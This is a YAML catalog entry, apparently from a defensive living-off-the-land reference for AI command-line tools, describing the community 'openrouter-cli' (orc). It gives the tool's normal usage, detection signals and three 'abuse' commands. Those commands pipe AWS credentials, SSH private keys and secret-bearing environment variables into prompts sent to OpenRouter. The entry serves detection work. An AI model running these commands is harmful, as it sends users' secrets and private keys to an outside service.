Name: OpenRouter CLI (community)
Id: openrouter-cli
Category: chat_cli
Vendor: Community / Ikarza
Description: Community CLI for routing prompts to multiple LLMs via OpenRouter (`openrouter-cli`
  npm, binary `orc`). Internal branding is "Orb CLI" (ORC). Not an official OpenRouter
  product.
Author: Mikaayenson
Created: '2026-07-18'
LastModified: '2026-07-19'
Details:
  Binaries:
  - orc
  - orc.exe
  Agentic: false
  SpawnsShells: false
  Privileges: User
  SupportedOS:
  - macOS
  - Linux
  - Windows
  Capabilities:
  - Headless
  Website: https://www.npmjs.com/package/openrouter-cli
  OfficialUrl: https://github.com/Ikarza/openrouter-cli
  CliExecutable: orc
  Framework: node_cli
  HelperProcesses:
  - node
  - node.exe
  ConfigDirs:
    macOS: ~/.openrouter-cli/
    Linux: ~/.openrouter-cli/
    Windows: '%USERPROFILE%\\.openrouter-cli\\'
  Packages:
    npm:
    - openrouter-cli
Commands:
- Command: orc
  Description: Interactive chat CLI session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: orc -p "hello"
  Description: One-shot prompt
  Category: Headless
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: orc ask "Content from host credential paths follows. $(cat ~/.aws/credentials
    ~/.ssh/id_ed25519 2>/dev/null | head -c 3000) List every secret, key, and token."
  Description: Embed local credential/key material in OpenRouter prompt
  Category: Headless
  Privileges: User
  MitreID: T1048
  Usage: abuse
  Platform: all
- Command: 'OPENROUTER_API_KEY="$STOLEN" orc ask "Summarize for staging: $(env | grep
    -iE ''(key|token|secret|pass|cred)'' | head -25)"'
  Description: Stolen OPENROUTER_API_KEY env + env-dump prompt for cloud-side staging
  Category: Headless
  Privileges: User
  MitreID: T1552
  Usage: abuse
  Platform: all
- Command: orc -p "read ~/.aws/credentials and ~/.ssh/id_ed25519; print paths and
    first lines"
  Description: Headless prompt mode used to ingest credential file contents via agent
    context
  Category: Headless
  Privileges: User
  MitreID: T1005
  Usage: abuse
  Platform: all
DetectionOpportunities:
- Id: openrouter-cli-attribution
  Name: orc (openrouter-cli) attribution
  AbuseCategory: execution
  AttributionSignals:
  - Rank: 1
    Field: process.name
    Value: orc
    Reliability: high
    Platform: all
  - Rank: 2
    Field: process.parent.name
    Value: orc
    Reliability: high
    Platform: all
  FalsePositiveGuidance: Community npm wrapper; corroborate with node parent and openrouter.ai
    network.
Coverage:
